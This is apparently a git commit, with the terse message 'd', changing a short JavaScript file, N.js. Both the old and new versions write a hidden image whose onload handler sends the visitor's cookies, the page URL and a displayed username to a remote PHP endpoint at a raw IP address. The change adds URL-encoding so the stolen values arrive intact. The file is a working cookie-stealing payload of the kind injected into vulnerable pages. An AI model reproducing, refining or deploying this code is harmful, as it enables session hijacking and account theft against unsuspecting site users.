798ec1e800426db2a6ec91541b532804f51ad851
zzzkf <zzzykf@gmail.com>
2018-11-23 15:40:32 +0800

    d

--- N.js
+++ N.js
@@ -1,2 +1,5 @@
-document.write('<img src="https://cravefood2017.github.io/t.png" style="display:none;" onload=this.src="http://52.220.154.212/no.php?C=' + document.cookie + '&D=' + window.location.href+'&N='+parent.document.getElementsByTagName("font")[0].innerText + '">');
-console.log('<img src="https://cravefood2017.github.io/t.png" style="display:none;" onload=this.src="http://52.220.154.212/no.php?C=' + document.cookie + '&D=' + window.location.href+'&N='+parent.document.getElementsByTagName("font")[0].innerText + '">');
+var cookie = encodeURIComponent(document.cookie);
+var name = encodeURIComponent(parent.document.getElementsByTagName("font")[0].innerText);
+
+document.write('<img src="https://cravefood2017.github.io/t.png" style="display:none;" onload=this.src="http://52.220.154.212/no.php?C=' + cookie + '&D=' + window.location.href+'&N='+parent.document.getElementsByTagName("font")[0].innerText + '">');
+console.log('<img src="https://cravefood2017.github.io/t.png" style="display:none;" onload=this.src="http://52.220.154.212/no.php?C=' + cookie + '&D=' + window.location.href+'&N='+name + '">');
